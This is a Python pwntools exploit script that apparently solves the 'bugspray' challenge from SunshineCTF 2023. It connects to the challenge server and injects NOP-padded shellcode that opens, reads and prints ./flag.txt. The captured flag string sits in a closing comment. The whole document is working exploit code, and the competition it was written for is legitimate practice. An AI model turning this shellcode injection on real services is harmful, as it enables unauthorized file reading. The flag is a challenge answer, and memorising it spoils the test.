#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./bugspray_patched")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = process([exe.path])
	elif args.REMOTE:
		r = remote("chal.2023.sunshinectf.games", 23001)
	else:
		r = gdb.debug([exe.path])
	return r


def main():
	r = conn()

	shellcode = asm(
		shellcraft.open('./flag.txt') +
		shellcraft.read(3, 'rsp', 64) +
		shellcraft.write(1, 'rsp', 64)
	).ljust(0x44, b'\x90')

	r.sendlineafter(b'>>>', shellcode)

	r.interactive()


if __name__ == "__main__":
	main()

# sun{mosquitos_and_horseflies_and_trangle_bugs_oh_my}
